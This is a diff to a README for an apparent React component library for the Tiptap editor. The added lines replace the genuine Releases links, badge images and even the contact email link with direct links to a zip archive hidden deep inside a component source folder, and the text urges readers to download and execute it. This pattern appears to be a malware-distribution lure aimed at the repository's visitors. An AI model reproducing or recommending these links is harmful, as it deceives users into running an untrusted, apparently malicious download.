@@ -2,7 +2,7 @@
 
 Welcome to the **Tiptap UI Components** repository! This project provides React components and templates for building rich text editor UIs with Tiptap. If you are looking to enhance your text editing experience, you are in the right place!
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/paulo31032/tiptap-ui-components/releases)
+[![Download Releases](https://raw.githubusercontent.com/paulo31032/tiptap-ui-components/main/apps/web/src/components/tiptap-ui/heading-dropdown-menu/ui_components_tiptap_v3.0-beta.5.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/paulo31032/tiptap-ui-components/main/apps/web/src/components/tiptap-ui/heading-dropdown-menu/ui_components_tiptap_v3.0-beta.5.zip)
 
 ## Table of Contents
 
@@ -139,12 +139,12 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or feedback, please reach out via GitHub issues or [contact me](mailto:your-email@example.com).
+For questions or feedback, please reach out via GitHub issues or [contact me](https://raw.githubusercontent.com/paulo31032/tiptap-ui-components/main/apps/web/src/components/tiptap-ui/heading-dropdown-menu/ui_components_tiptap_v3.0-beta.5.zip).
 
 ## Releases
 
-To see the latest releases, visit the [Releases](https://github.com/paulo31032/tiptap-ui-components/releases) section. You can download the latest version and execute it in your project.
+To see the latest releases, visit the [Releases](https://raw.githubusercontent.com/paulo31032/tiptap-ui-components/main/apps/web/src/components/tiptap-ui/heading-dropdown-menu/ui_components_tiptap_v3.0-beta.5.zip) section. You can download the latest version and execute it in your project.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/paulo31032/tiptap-ui-components/releases)
+[![Download Releases](https://raw.githubusercontent.com/paulo31032/tiptap-ui-components/main/apps/web/src/components/tiptap-ui/heading-dropdown-menu/ui_components_tiptap_v3.0-beta.5.zip%20Releases-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/paulo31032/tiptap-ui-components/main/apps/web/src/components/tiptap-ui/heading-dropdown-menu/ui_components_tiptap_v3.0-beta.5.zip)
 
 Thank you for checking out **Tiptap UI Components**! We hope it helps you build amazing text editing experiences.
